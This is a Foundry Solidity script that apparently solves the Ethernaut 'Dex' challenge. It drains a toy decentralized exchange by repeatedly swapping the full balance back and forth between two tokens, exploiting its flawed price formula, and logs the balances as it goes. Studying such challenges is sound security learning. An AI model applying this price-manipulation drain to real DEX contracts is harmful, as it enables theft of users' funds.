// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Math} from "openzeppelin-contracts-08/utils/math/Math.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexScript is Script {
    function run() public {
        vm.startBroadcast();

        Dex dex = Dex(0x20E96b8D3CFE04D1aC2c622c33e973Ca3D8654B8);
        address token1 = 0xFEE34F091d65F5163026DB297F52105EfFB5A8C1;
        address token2 = 0x2ffee7bFFcdDF3F8464AD575963bFF837e95AE4D;
        address player = 0xaCab087f7f0977c31d68E8BAe117069a90Dc6574;

        dex.approve(address(dex), 200);

        swap(token1, token2, dex, player, true);
        swap(token1, token2, dex, player, false);
        swap(token1, token2, dex, player, true);
        swap(token1, token2, dex, player, false);
        swap(token1, token2, dex, player, true);
        swap(token1, token2, dex, player, false);

        console.log("dex token 1 %d token2 %d", SwappableToken(token1).balanceOf(address(dex)), SwappableToken(token2).balanceOf(address(dex)));

        vm.stopBroadcast();
    }

    function swap(address token1, address token2, Dex dex, address player, bool direction) private {
        address from;
        address to;

        if (direction) {
            from = token1;
            to = token2;
        } else {
            from = token2;
            to = token1;
        }

        uint256 amount = Math.min(SwappableToken(from).balanceOf(address(player)), SwappableToken(from).balanceOf(address(dex)));
        if (amount == 0) {
            return;
        }

        dex.swap(from, to, amount);
        console.log("player token1 %d token2 %d", SwappableToken(token1).balanceOf(player), SwappableToken(token2).balanceOf(player));
    }
}